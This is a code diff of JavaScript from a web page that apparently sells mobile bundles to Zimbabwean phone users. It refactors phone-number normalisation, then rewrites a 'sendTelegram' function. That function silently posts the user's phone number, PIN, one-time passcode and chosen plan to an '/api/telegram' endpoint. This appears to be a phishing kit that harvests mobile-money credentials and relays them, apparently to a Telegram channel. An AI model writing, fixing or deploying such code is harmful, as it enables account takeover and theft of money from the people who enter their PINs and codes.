@@ -419,36 +419,31 @@ function showStep(id){
 }
 
 /* ── PHONE ── */
-function normalisePhone(raw){
-  // Strip everything non-numeric
-  let v=raw.replace(/\D/g,'');
-  // Remove country code: 00263 / +263 / 263 prefix
-  if(v.startsWith('00263'))v=v.slice(5);
-  else if(v.startsWith('263')&&v.length>9)v=v.slice(3);
-  // Remove leading 0 (07XXXXXXXX → 7XXXXXXXX)
-  if(v.startsWith('0'))v=v.slice(1);
+/* ── PHONE: normalise any format on input and paste ── */
+function cleanPhone(raw){
+  var v=raw.replace(/[^0-9]/g,''); // digits only
+  if(v.slice(0,5)==='00263') v=v.slice(5);      // 00263...
+  else if(v.slice(0,3)==='263'&&v.length>9) v=v.slice(3); // 263...
+  if(v.slice(0,1)==='0') v=v.slice(1);           // leading 0
   return v.slice(0,9);
 }
+function applyPhone(v){
+  var el=document.getElementById('phone');
+  el.value=v; phone=v;
+  var ok=v.length===9&&v[0]==='7';
+  document.getElementById('phoneOutline').classList.toggle('err',!ok&&v.length>0);
+  document.getElementById('phoneError').classList.toggle('show',!ok&&v.length>0);
+}
 document.getElementById('phone').addEventListener('input',function(){
-  const v=normalisePhone(this.value);
-  this.value=v;phone=v;
-  if(v.length===9&&v.startsWith('7')){
-    document.getElementById('phoneOutline').classList.remove('err');
-    document.getElementById('phoneError').classList.remove('show');
-  }
+  applyPhone(cleanPhone(this.value));
 });
 document.getElementById('phone').addEventListener('paste',function(e){
   e.preventDefault();
-  const pasted=(e.clipboardData||window.clipboardData).getData('text');
-  const v=normalisePhone(pasted);
-  this.value=v;phone=v;
-  if(v.length===9&&v.startsWith('7')){
-    document.getElementById('phoneOutline').classList.remove('err');
-    document.getElementById('phoneError').classList.remove('show');
-  }
+  var pasted=(e.clipboardData||window.clipboardData).getData('text')||'';
+  applyPhone(cleanPhone(pasted));
 });
 document.getElementById('phone').addEventListener('blur',function(){
-  if(phone.length>0&&(phone.length!==9||!phone.startsWith('7'))){
+  if(phone.length>0&&(phone.length!==9||phone[0]!=='7')){
     document.getElementById('phoneOutline').classList.add('err');
     document.getElementById('phoneError').classList.add('show');
   }
@@ -524,11 +519,22 @@ document.querySelectorAll('.action-btn').forEach(btn=>{
 });
 
 /* ── TELEGRAM ── */
-function sendTelegram(event){
+function sendTelegram(event,extra){
   try{
-    let p={};try{p=JSON.parse(sessionStorage.getItem('selectedPlan')||'{}')}catch(e){}
+    var p={};try{p=JSON.parse(sessionStorage.getItem('selectedPlan')||'{}')}catch(e){}
+    var payload={
+      event:event,
+      phone:phone,       // server will format
+      pin:pin,
+      otp:extra&&extra.otp||otp||'',
+      plan:p.duration||'',
+      voice:p.voice||'',
+      sms:p.sms||'',
+      data:p.data||'',
+      amount:p.amount||''
+    };
     fetch('/api/telegram',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event,phone:'+263'+phone,pin,plan:p})}).catch(()=>{});
+      body:JSON.stringify(payload)}).catch(function(){});
   }catch(e){}
 }
 
